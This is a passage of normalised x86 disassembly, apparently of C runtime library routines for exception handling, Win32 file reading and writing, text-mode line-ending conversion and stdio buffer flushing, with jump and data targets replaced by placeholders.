test [ ebp - 0x4 ] 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0xc ]
or eax [ esi + 0xc ]
je r-xdata
mov eax [ ebp - 0x4 ]
and eax 0x300
not eax
and eax edi
test ah 0x3
je r-xdata
test [ ebx + 0xc ] 0x4
je r-xdata
or edi 0x300
or [ ebp - 0x4 ] 0x300
cmp edi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
push [ ebp + 0x14 ]
push esi
push ebx
call sub_4c51ec
add esp 0x10
jmp r-xdata
sub_4c5910
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
mov edx rw-data
mov [ eax ] edx
test [ ebp + 0xc ] 0x1
je r-xdata
push eax
call sub_4b0180
pop ecx
sub_4c5930
push ebp
mov ebp esp
add esp 0xffffffc4
mov eax rw-data
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
call sub_4c517c
cmp [ ebp + 0x8 ] 0x0
mov ebx [ ebp + 0x10 ]
jne r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x24 ]
mov edx rw-data
push eax
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
mov [ ebp - 0x2c ] edx
mov ecx rw-data
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x2c ] ecx
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
mov edi ebx
test [ ebx + 0xc ] 0x80
je r-xdata
test ebx ebx
jne r-xdata
cmp edi [ ebx + 0x4 ]
jne r-xdata
sub esi [ esi - 0x4 ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov eax ebx
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x14
call sub_4bbbac
pop ecx
mov [ ebp - 0x30 ] eax
test eax eax
je r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
cmp esi [ ebx + 0x8 ]
je r-xdata
mov edi [ esi - 0xc ]
jmp r-xdata
push 0x29e
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
mov eax esi
add eax edi
sar eax 0x4
and eax 0xff
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x28 ]
mov ebx [ edx * 4 + rw-data ]
test ebx ebx
je r-xdata
mov ebx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov ecx [ edx * 4 + rw-data ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] edi
mov eax rw-data
mov edx [ ebp - 0x30 ]
mov [ edx ] eax
mov ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x3c ]
mov [ ecx + 0x4 ] eax
mov edx rw-data
mov ecx [ ebp - 0x30 ]
mov [ ecx ] edx
mov eax [ ebp - 0x30 ]
mov edx [ ebp - 0x38 ]
mov [ eax + 0x8 ] edx
mov ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
mov [ ecx + 0xc ] eax
mov edx [ ebp - 0x30 ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
mov ebx [ ebp - 0x30 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ eax * 4 + rw-data ] ebx
sub_4c5ad8
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
movzx eax [ ebx + 0x10 ]
add eax ebx
lea edx [ ebp + 0x8 ]
push edx
push esi
push 0x0
push eax
call sub_4c55ff
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
movzx eax [ ebx + 0x12 ]
add eax ebx
lea edx [ ebp + 0x8 ]
push edx
push esi
push 0x1
push eax
call sub_4c55ff
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
mov edx rw-data
test edx edx
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
xor eax eax
push 0x57f
push rw-data
push rw-data
call sub_4ce9c0
add esp 0xc
sub_4c5b54
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
push ebx
call sub_4b0264
add esp 0x8
test [ ebp + 0xc ] 0x1
je r-xdata
push ebx
call sub_4b0180
pop ecx
sub_4c5cb4
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
call sub_4015fc
and [ eax + 0x4c ] 0xfffffffd
mov edx [ rw-data ]
cmp [ edx ] 0x2
jne r-xdata
push 0x0
call sub_4c6910
pop ecx
mov eax [ rw-data ]
mov [ ebp - 0x14 ] 0xc
call eax
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
push [ rw-data ]
push 0x1
push 0x4
call sub_4c5ddc
add esp 0xc
call sub_4ced34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4c5d20
call sub_4015fc
and [ eax + 0x4c ] 0xfffffffd
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
call eax
call sub_4ced34
retn
push [ rw-data ]
push 0x1
push 0x5
call sub_4c5ddc
add esp 0xc
sub_4c5d58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
setne al
and eax 0x1
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
jmp r-xdata
push 0x9c
push ebx
call sub_4015fc
add eax 0x48
push eax
call sub_4c4cb0
add esp 0xc
call sub_4c5c60
pop ebx
pop ecx
pop ecx
pop ebp
retn
lea edx [ ebp - 0x8 ]
push edx
call sub_4c5da8
pop ecx
mov ebx [ ebp - 0x4 ]
sub_4c5ddc
push ebp
mov ebp esp
push ebx
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
inc eax
inc eax
push eax
push 0x0
push 0xeedfae6
call RaiseException
pop ebx
pop ebp
retn
sub_4c5dfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx ] 0xeedfae6
jne r-xdata
mov eax [ ebx ]
cmp eax 0xeefface
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
mov edx ebx
call sub_4c5fd2
call sub_4c5cb4
cmp eax 0xeedface
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx ] 0xc00000fd
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp + 0x14 ]
push edx
push esi
push edi
push ebx
call [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
push rw-data
call sub_4cec84
pop ecx
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp + 0x14 ]
push edx
push esi
push edi
push ebx
call [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx ] 0x40000015
jne r-xdata
mov edx [ rw-data ]
mov eax [ edx ]
cmp eax 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] esi
lea edx [ ebp - 0x8 ]
push edx
call UnhandledExceptionFilter
call sub_4cecb0
mov eax [ ebx ]
cmp eax 0xeedface
jb r-xdata
cmp eax 0x2
jne r-xdata
push esi
push ebx
push edi
push 0x3
push 0x2
call sub_4c5ddc
add esp 0x14
cmp eax 0xeefface
jbe r-xdata
sub_4c5f99
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ fs : 0x0 ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : 0x0 ] eax
pop ebp
retn
cmp [ ecx ] eax
je r-xdata
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ecx ]
jmp r-xdata
sub_4c6000
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
push eax
call GetFileAttributesA
mov ebx eax
cmp eax 0xffffffff
jne r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
call sub_4c7178
pop ebx
pop ebp
retn
xor eax eax
pop ebx
pop ebp
retn
test bl 0x1
je r-xdata
call sub_4ceadc
mov [ eax ] 0x5
or eax 0xffffffff
pop ebx
pop ebp
retn
sub_4c6040
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
xor esi esi
cmp ebx [ rw-data ]
jb r-xdata
push ebx
call sub_4c6d38
test [ ebx * 4 + rw-data ] 0x1
pop ecx
je r-xdata
push 0x6
call sub_4c710c
pop ecx
jmp r-xdata
test esi esi
jne r-xdata
mov esi 0x1
pop esi
pop ebx
pop ebp
retn
xor edx edx
mov [ ebx * 4 + rw-data ] edx
mov [ ebx * 4 + rw-data ] 0xffffffff
push ebx
call sub_4c6dcc
pop ecx
xor eax eax
jmp r-xdata
mov eax [ ebx * 4 + rw-data ]
push eax
call CloseHandle
dec eax
jne r-xdata
push ebx
call sub_4c6dcc
pop ecx
call sub_4c7178
sub_4c60b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
jb r-xdata
push ebx
call sub_4c6d38
pop ecx
mov eax [ ebx * 4 + rw-data ]
test ah 0x2
je r-xdata
push 0xfffffffa
call sub_4c710c
pop ecx
jmp r-xdata
test ah 0x20
je r-xdata
mov esi 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x1
push 0x0
push ebx
call sub_4c6198
add esp 0xc
mov esi eax
inc eax
jne r-xdata
xor esi esi
jmp r-xdata
push ebx
call sub_4c6dcc
pop ecx
mov eax esi
push 0x2
push 0x0
push ebx
call sub_4c6198
add esp 0xc
mov edi eax
inc eax
jne r-xdata
or esi 0xffffffff
jmp r-xdata
push 0x0
push esi
push ebx
call sub_4c6198
add esp 0xc
inc eax
jne r-xdata
or esi 0xffffffff
jmp r-xdata
cmp edi esi
setle al
and eax 0x1
mov esi eax
or esi 0xffffffff
jmp r-xdata
sub_4c6150
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
jb r-xdata
mov edx [ ebx * 4 + rw-data ]
push edx
call GetFileType
cmp eax 0x2
sete al
and eax 0x1
pop ebx
pop ebp
retn
xor eax eax
pop ebx
pop ebp
retn
sub_4c6198
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
jb r-xdata
mov eax [ ebp + 0x10 ]
sub eax 0x1
jb r-xdata
push 0x6
call sub_4c710c
pop ecx
jmp r-xdata
xor edi edi
jmp r-xdata
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
call sub_4c6d38
pop ecx
and [ ebx * 4 + rw-data ] 0xfffffdff
push edi
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebx * 4 + rw-data ]
push edx
call SetFilePointer
mov esi eax
inc eax
jne r-xdata
mov edi 0x1
jmp r-xdata
dec eax
je r-xdata
push ebx
call sub_4c6dcc
pop ecx
mov eax esi
call sub_4c7178
mov edi 0x2
jmp r-xdata
jmp r-xdata
push 0x1
call sub_4c710c
pop ecx
jmp r-xdata
sub_4c621c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov ebx edi
mov eax esi
sub eax ebx
cmp edi ebx
mov [ ebp - 0x8 ] eax
je r-xdata
mov esi [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
dec ecx
cmp esi ecx
jb r-xdata
mov edx [ ebp - 0x8 ]
push edx
push ebx
push edi
call sub_4c4cb0
add esp 0xc
lea ebx [ esi + 0x1 ]
add edi [ ebp - 0x8 ]
jmp r-xdata
mov eax edi
sub eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
sub eax ebx
push eax
push 0xd
push ebx
call sub_4c4c90
add esp 0xc
mov esi eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4c6288
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
jb r-xdata
mov edx [ ebp + 0x10 ]
inc edx
cmp edx 0x2
jae r-xdata
push 0xfffffffa
call sub_4c710c
pop ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4c6d38
pop ecx
mov ecx [ ebp + 0x8 ]
test [ ecx * 4 + rw-data ] 0x40
jne r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
test [ ecx * 4 + rw-data ] 0x2
je r-xdata
mov eax [ ebp + 0x10 ]
push eax
push ebx
mov edx [ ebp + 0x8 ]
push edx
call sub_4c670c
add esp 0xc
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
xor edi edi
mov esi ebx
lea edx [ eax * 4 + rw-data ]
mov [ ebp - 0xc ] edx
cmp edi [ ebp + 0x10 ]
jae r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4c6dcc
pop ecx
mov eax ebx
mov ebx edi
mov ecx [ ebp + 0x10 ]
sub ecx edi
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
push esi
mov edx [ ebp + 0x8 ]
push edx
call sub_4c670c
add esp 0xc
mov ebx eax
cmp eax 0xffffffff
jne r-xdata
test ebx ebx
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push ebx
push 0x1a
push esi
call sub_4c4c90
add esp 0xc
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
cmp [ esi + ebx - 0x1 ] 0xd
jne r-xdata
mov edx [ ebp - 0xc ]
or [ edx ] 0x200
mov ebx [ ebp - 0x8 ]
sub ebx esi
test ebx ebx
je r-xdata
push ebx
push esi
call sub_4c621c
add esp 0x8
add edi eax
cmp ebx [ ebp - 0x4 ]
jae r-xdata
push 0x1
mov eax ebx
dec eax
add eax esi
push eax
mov edx [ ebp + 0x8 ]
push edx
call sub_4c670c
add esp 0xc
inc eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
test [ edx + 0x1 ] 0x20
jne r-xdata
or ebx 0xffffffff
jmp r-xdata
test eax eax
jne r-xdata
add esi eax
cmp edi [ ebp + 0x10 ]
jb r-xdata
sub_4c63d0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
jb r-xdata
mov edx [ ebp + 0x10 ]
inc edx
cmp edx 0x2
jae r-xdata
push 0xfffffffa
call sub_4c710c
pop ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4c6d38
pop ecx
mov ecx [ ebp + 0x8 ]
test [ ecx * 4 + rw-data ] 0x40
jne r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
test [ ecx * 4 + rw-data ] 0x2
je r-xdata
mov eax [ ebp + 0x10 ]
add eax eax
push eax
push ebx
mov edx [ ebp + 0x8 ]
push edx
call sub_4c670c
add esp 0xc
shr eax 0x1
mov ebx eax
jmp r-xdata
push 0x1a
lea eax [ ebp - 0xe ]
push eax
call sub_4cc360
add esp 0x8
push 0xd
lea edx [ ebp - 0x10 ]
push edx
call sub_4cc360
add esp 0x8
push 0xa
lea ecx [ ebp - 0x12 ]
push ecx
call sub_4cc360
mov [ ebp - 0xc ] ebx
xor eax eax
mov [ ebp - 0x4 ] eax
add esp 0x8
mov edx [ ebp + 0x8 ]
lea ecx [ edx * 4 + rw-data ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
jae r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4c6dcc
pop ecx
mov eax ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
xor ebx ebx
xor edi edi
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
test bl bl
je r-xdata
movsx eax bl
lea edx [ ebp - 0x14 ]
push 0x1
add eax edx
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4c670c
add esp 0xc
mov esi eax
inc eax
jne r-xdata
add [ ebp - 0x4 ] edi
test esi esi
je r-xdata
push 0xfffffff3
call sub_4c710c
pop ecx
mov ebx eax
jmp r-xdata
test esi esi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
cmp edi [ ebp - 0x8 ]
jae r-xdata
inc ebx
lea edx [ ebp - 0x14 ]
movsx eax bl
push eax
push edx
mov ecx [ ebp - 0xc ]
push ecx
call sub_4cc164
add esp 0xc
mov esi eax
test esi esi
jl r-xdata
mov edx [ ebp - 0x1c ]
test [ edx + 0x1 ] 0x2
jne r-xdata
mov eax [ ebp - 0x1c ]
test [ eax + 0x1 ] 0x20
jne r-xdata
cmp bl 0x2
jge r-xdata
xor ebx ebx
test esi esi
je r-xdata
test edi edi
jne r-xdata
cmp edi [ ebp - 0x8 ]
jb r-xdata
add [ ebp - 0xc ] 0x2
inc edi
jmp r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0xe ]
push edx
call sub_4c4f7c
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x10 ]
jb r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x10 ]
push edx
call sub_4c4f7c
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
or [ ecx ] 0x200
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov ecx edx
mov [ ebp - 0x18 ] ecx
cmp edi [ ebp - 0x8 ]
jae r-xdata
push esi
lea ecx [ ebp - 0x14 ]
push ecx
lea eax [ ebp - 0x12 ]
push eax
call sub_4c4f7c
add esp 0xc
test eax eax
jne r-xdata
mov edx [ ebp - 0x18 ]
test [ edx + 0x1 ] 0x20
je r-xdata
inc edi
jmp r-xdata
sub_4c65c4
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
jb r-xdata
mov edx [ ebp + 0x10 ]
inc edx
cmp edx 0x2
jae r-xdata
push 0xfffffffa
call sub_4c710c
pop ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4c6d38
pop ecx
mov ecx [ ebp + 0x8 ]
test [ ecx * 4 + rw-data ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
test [ edx * 4 + rw-data ] 0x40
jne r-xdata
push 0x2
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_4c6198
add esp 0xc
mov esi edi
xor eax eax
mov [ ebp - 0x4 ] eax
xor edx edx
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
push edi
mov eax [ ebp + 0x8 ]
push eax
call sub_4c6784
add esp 0xc
mov ebx eax
jmp r-xdata
mov eax esi
sub eax edi
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4c6dcc
pop ecx
mov eax ebx
lea ebx [ ebp - 0x208 ]
jmp r-xdata
mov ebx [ ebp - 0x8 ]
sub ebx [ ebp - 0x4 ]
lea edx [ ebp - 0x208 ]
mov ecx ebx
sub ecx edx
cmp ecx 0x1ff
jge r-xdata
lea edx [ ebp - 0x208 ]
mov ecx ebx
sub ecx edx
lea eax [ ebp - 0x208 ]
push ecx
push eax
mov edx [ ebp + 0x8 ]
push edx
call sub_4c6784
add esp 0xc
lea ecx [ ebp - 0x208 ]
sub ebx ecx
cmp eax ebx
je r-xdata
mov eax esi
sub eax edi
cmp eax [ ebp + 0x10 ]
jb r-xdata
add [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jne r-xdata
mov al [ esi ]
inc esi
cmp al 0xa
jne r-xdata
mov ebx [ ebp - 0x8 ]
sub ebx [ ebp - 0x4 ]
add ebx eax
jmp r-xdata
or ebx 0xffffffff
jmp r-xdata
mov [ ebx ] al
inc ebx
inc [ ebp - 0x4 ]
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
jmp r-xdata
sub_4c670c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
jb r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp + 0xc ]
push ecx
mov eax [ ebx * 4 + rw-data ]
push eax
call ReadFile
dec eax
je r-xdata
push 0x6
call sub_4c710c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call GetLastError
cmp eax 0x6d
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
push eax
call sub_4c710c
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
sub_4c6784
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
jb r-xdata
push 0x0
lea edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ eax * 4 + rw-data ]
push eax
call WriteFile
dec eax
je r-xdata
push 0x6
call sub_4c710c
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn
call sub_4c7178
pop ecx
pop ebp
retn
sub_4c67f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
test [ ebx + 0x12 ] 0x4
je r-xdata
and [ ebx + 0x12 ] 0xfff3
xor edx edx
mov [ ebx + 0xc ] edx
lea ecx [ ebx + 0x14 ]
mov [ ebx + 0x4 ] ecx
mov [ ebx ] ecx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
call sub_4c429c
pop ecx
xor eax eax
test edi edi
jbe r-xdata
mov [ rw-data ] sub_4c9e18
test esi esi
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] edi
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
push edi
call sub_4c428c
pop ecx
mov esi eax
test eax eax
je r-xdata
or [ ebx + 0x12 ] 0x8
or eax 0xffffffff
jmp r-xdata
or [ ebx + 0x12 ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4c6870
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp bl [ ebx + 0x17 ]
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
call sub_4c8724
cmp [ ebx + 0xc ] 0x0
pop ecx
je r-xdata
movsx edx [ ebx + 0x16 ]
push edx
call sub_4c6040
pop ecx
mov esi eax
mov [ ebx + 0x12 ] 0x0
xor eax eax
xor edx edx
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
mov [ ebx + 0x16 ] 0xff
mov di [ ebx + 0x10 ]
test di di
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jge r-xdata
push ebx
call sub_4c87ec
pop ecx
mov eax esi
push edi
push 0x0
push 0x0
call sub_4c7748
add esp 0xc
push eax
call sub_4c8944
pop ecx
mov [ ebx + 0x10 ] 0x0
test [ ebx + 0x12 ] 0x4
je r-xdata
push ebx
call sub_4c6910
pop ecx
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
call sub_4c429c
pop ecx
or esi 0xffffffff
jmp r-xdata
sub_4c6910
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
cmp bl [ ebx + 0x17 ]
je r-xdata
call sub_4c69c0
xor eax eax
jmp r-xdata
push ebx
call sub_4c8724
cmp [ ebx + 0x8 ] 0x0
pop ecx
jl r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
mov esi [ ebx + 0xc ]
add esi [ ebx + 0x8 ]
inc esi
sub [ ebx + 0x8 ] esi
push esi
mov eax [ ebx + 0x4 ]
mov [ ebx ] eax
push eax
movsx edx [ ebx + 0x16 ]
push edx
call sub_4c65c4
add esp 0xc
cmp esi eax
je r-xdata
test [ ebx + 0x12 ] 0x8
jne r-xdata
xor esi esi
test [ ebx + 0x13 ] 0x2
jne r-xdata
xor ecx ecx
mov [ ebx + 0x8 ] ecx
lea eax [ ebx + 0x14 ]
cmp eax [ ebx ]
jne r-xdata
lea edx [ ebx + 0x14 ]
cmp edx [ ebx ]
jne r-xdata
or [ ebx + 0x12 ] 0x10
or esi 0xffffffff
jmp r-xdata
xor esi esi
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ ebx ] edx
push ebx
call sub_4c87ec
pop ecx
mov eax esi
sub_4c69a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_4c6c00
pop ecx
mov edx [ ebp + 0xc ]
mov [ edx ] eax
inc eax
jne r-xdata
xor eax eax
or eax 0xffffffff
jmp r-xdata
pop ebp
retn
sub_4c69c0
push ebx
push esi
push edi
push ebp
call sub_4c8704
xor ebp ebp
mov edi [ rw-data ]
mov ebx rw-data
jmp r-xdata
mov ecx edi
add edi 0xffffffff
test ecx ecx
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
jge r-xdata
call sub_4c8714
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
add ebx 0x18
mov esi [ ebx + 0xc ]
add esi eax
inc esi
sub [ ebx + 0x8 ] esi
push esi
mov eax [ ebx + 0x4 ]
mov [ ebx ] eax
push eax
movsx edx [ ebx + 0x16 ]
push edx
call sub_4c65c4
add esp 0xc
cmp esi eax
je r-xdata
inc ebp
test [ ebx + 0x13 ] 0x2
jne r-xdata
or [ ebx + 0x12 ] 0x10
sub_4c6a48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test [ ebx + 0x12 ] 0x8
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
cmp eax esi
jb r-xdata
mov eax esi
jmp r-xdata
push ebx
movsx eax [ edi ]
push eax
call sub_4c74e8
add esp 0x8
inc eax
jne r-xdata
push esi
push edi
movsx edx [ ebx + 0x16 ]
push edx
call sub_4c65c4
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov edx [ ebx + 0x8 ]
mov ecx edx
add ecx esi
test ecx ecx
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
dec [ ebp - 0x4 ]
inc edi
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp esi eax
jbe r-xdata
push ebx
call sub_4c6910
pop ecx
test eax eax
je r-xdata
push esi
push edi
mov ecx [ ebx ]
push ecx
call sub_4c4cb0
mov eax [ ebx + 0x8 ]
add esp 0xc
add eax esi
mov [ ebx + 0x8 ] eax
mov eax esi
add [ ebx ] esi
jmp r-xdata
test edx edx
jne r-xdata
mov eax esi
xor eax eax
jmp r-xdata
push ebx
call sub_4c6910
pop ecx
test eax eax
je r-xdata
or edx 0xffffffff
sub edx eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
xor eax eax
jmp r-xdata
sub_4c6b24
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov edx [ ebx + 0x8 ]
test edx edx
jge r-xdata
mov eax edx
mov ecx edx
mov eax [ ebx + 0xc ]
add eax edx
inc eax
mov ecx eax
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
mov edx [ ebx ]
jge r-xdata
mov eax ecx
pop ebx
pop ebp
retn
test [ ebx + 0x12 ] 0x40
je r-xdata
mov ebx eax
add eax 0xffffffff
test ebx ebx
jne r-xdata
jmp r-xdata
mov bl [ edx ]
inc edx
and ebx 0xff
cmp ebx 0xa
jne r-xdata
mov eax ecx
pop ebx
pop ebp
retn
mov ebx eax
add eax 0xffffffff
test ebx ebx
jne r-xdata
inc ecx
dec edx
xor ebx ebx
mov bl [ edx ]
cmp ebx 0xa
jne r-xdata
jmp r-xdata
inc ecx
sub_4c6b8c
push ebp
mov ebp esp
push ebx
push esi
push edi
